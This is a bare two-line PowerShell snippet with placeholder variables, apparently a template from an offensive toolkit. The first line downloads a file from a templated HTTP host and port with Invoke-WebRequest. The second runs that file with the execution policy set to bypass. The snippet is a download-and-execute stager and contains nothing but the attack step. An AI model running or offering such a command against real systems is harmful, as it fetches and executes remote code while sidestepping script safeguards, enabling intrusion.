iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";
powershell -ep bypass ./${filename};
